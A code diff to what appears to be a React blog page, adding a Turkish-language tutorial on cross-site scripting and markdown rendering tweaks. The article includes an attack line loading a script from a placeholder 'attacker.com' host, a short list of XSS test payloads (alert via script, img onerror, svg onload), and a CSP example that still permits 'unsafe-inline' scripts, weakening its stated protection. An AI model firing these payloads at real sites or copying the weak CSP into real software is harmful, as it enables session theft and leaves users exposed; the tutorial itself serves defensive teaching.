@@ -76,11 +76,99 @@ function validateInput(input) {
 document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
 \`\`\`
 
+## Gerçek Dünya Örnekleri
+
+### Facebook'ta XSS Zafiyet Örneği (2011)
+Facebook'ta keşfedilen bir XSS açığı, kullanıcıların profil sayfalarına zararlı kod yerleştirmelerine olanak tanıyordu:
+
+\`\`\`javascript
+// Örnek saldırı vektörü
+javascript:void($.getScript('http://attacker.com/malicious.js'))
+\`\`\`
+
+### Twitter'da Self-XSS Saldırısı
+Kullanıcıları, konsola kod yapıştırmaya ikna eden sosyal mühendislik saldırısı:
+
+\`\`\`javascript
+// Kullanıcıları kandırmaya yönelik kod
+console.log("Bu kodu çalıştırırsanız hesabınız hack'lenebilir!");
+\`\`\`
+
+## İleri Seviye Korunma Teknikleri
+
+### 1. DOM Purify Kullanımı
+\`\`\`javascript
+import DOMPurify from 'dompurify';
+
+// Güvenli HTML temizleme
+const cleanHTML = DOMPurify.sanitize(dirtyHTML);
+document.getElementById('content').innerHTML = cleanHTML;
+\`\`\`
+
+### 2. React'ta Güvenli Rendering
+\`\`\`jsx
+// Güvenli - React otomatik olarak escape eder
+function SafeComponent({ userInput }) {
+  return <div>{userInput}</div>;
+}
+
+// Tehlikeli - dangerouslySetInnerHTML kullanımı
+function DangerousComponent({ htmlContent }) {
+  return (
+    <div 
+      dangerouslySetInnerHTML={{
+        __html: DOMPurify.sanitize(htmlContent)
+      }} 
+    />
+  );
+}
+\`\`\`
+
+### 3. Express.js'te CSP Middleware
+\`\`\`javascript
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "'unsafe-inline'"],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "data:", "https:"],
+  },
+}));
+\`\`\`
+
+## Penetration Testing için XSS Payloadları
+
+> **Uyarı:** Bu payloadlar sadece eğitim amaçlıdır ve sadece sahip olduğunuz sistemlerde test edilmelidir.
+
+\`\`\`javascript
+// Basit alert payload'u
+<script>alert('XSS')</script>
+
+// Image tag ile payload
+<img src=x onerror=alert('XSS')>
+
+// SVG ile payload
+<svg onload=alert('XSS')>
+
+// Form ile payload
+<form><button formaction=javascript:alert('XSS')>Test</button></form>
+\`\`\`
+
 ## Sonuç
 
-XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik testleri, input validation ve CSP gibi koruma mekanizmalarını implement ederek bu tehditlere karşı korunabiliriz.
+XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik testleri, input validation, CSP gibi koruma mekanizmalarını implement ederek bu tehditlere karşı korunabiliriz.
 
-**Unutmayın:** Güvenlik, bir hedef değil sürekli bir süreçtir.`
+### Önemli Hatırlatmalar:
+
+1. **Hiçbir zaman kullanıcı girdisine güvenmeyin**
+2. **Her zaman input validation yapın**
+3. **Output encoding kullanın**
+4. **Content Security Policy implementasyonu yapın**
+5. **Düzenli güvenlik testleri gerçekleştirin**
+
+**Unutmayın:** Güvenlik, bir hedef değil sürekli bir süreçtir. Her zaman güncel kalın ve yeni tehditlere karşı hazırlıklı olun.`
   };
 
   const getCategoryColor = (category: string) => {
@@ -179,15 +267,18 @@ XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik
                 <div className="prose prose-lg max-w-none">
                   <ReactMarkdown
                     components={{
-                      code(props) {
-                        const {children, className, ...rest} = props;
+                      code({ children, className, ...rest }) {
                         const match = /language-(\w+)/.exec(className || '');
                         return match ? (
                           <SyntaxHighlighter
-                            style={oneDark as any}
+                            style={oneDark}
                             language={match[1]}
                             PreTag="div"
-                            {...rest}
+                            customStyle={{
+                              margin: '1.5rem 0',
+                              borderRadius: '0.5rem',
+                              fontSize: '0.875rem'
+                            }}
                           >
                             {String(children).replace(/\n$/, '')}
                           </SyntaxHighlighter>
@@ -202,6 +293,14 @@ XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik
                       h3: ({children}) => <h3 className="text-xl font-bold text-gray-900 mt-4 mb-2">{children}</h3>,
                       p: ({children}) => <p className="text-gray-700 leading-relaxed mb-4">{children}</p>,
                       strong: ({children}) => <strong className="font-bold text-gray-900">{children}</strong>,
+                      blockquote: ({children}) => (
+                        <blockquote className="border-l-4 border-blue-500 pl-4 italic text-gray-600 my-4 bg-blue-50 py-2">
+                          {children}
+                        </blockquote>
+                      ),
+                      ul: ({children}) => <ul className="list-disc list-inside mb-4 space-y-1">{children}</ul>,
+                      ol: ({children}) => <ol className="list-decimal list-inside mb-4 space-y-1">{children}</ol>,
+                      li: ({children}) => <li className="mb-1 text-gray-700">{children}</li>,
                     }}
                   >
                     {post.content}
